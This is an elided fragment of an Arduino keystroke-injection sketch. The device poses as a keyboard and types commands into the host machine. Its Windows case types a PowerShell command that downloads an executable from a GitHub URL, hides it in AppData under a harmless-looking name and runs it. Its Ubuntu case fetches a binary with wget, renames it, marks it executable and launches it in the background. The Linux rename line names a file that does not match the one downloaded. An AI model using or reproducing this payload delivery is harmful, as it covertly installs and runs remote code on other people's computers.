...
void loop() {
  ...
  switch (platform) {
    ...
    case WINDOWS:
      ...
      Keyboard.print("powershell -command \"$clnt = new-object System.Net.WebClient; $clnt.DownloadFile('https://github.com/EzLucky/test/blob/master/agent.exe?raw=true', '%AppData%/WindowsApp/hostManager.exe');\" & attrib +h %AppData%/WindowsApp/hostManager.exe & %AppData%/WindowsApp/hostManager.exe & exit");
      delay(100);
      Keyboard.write(KEY_RETURN);
      break;
    case UBUNTU:
      ...
      Keyboard.print("mkdir .profiles && cd .profiles && wget https://github.com/drougeek/projkit/blob/master/agent.exe?raw=true && mv a.exe?raw=true clean_profile && chmod +x clean_profile && (nohup bash clean_profile &); exit");
      delay(100);
      Keyboard.write(KEY_RETURN);
  }
  //do nothing:
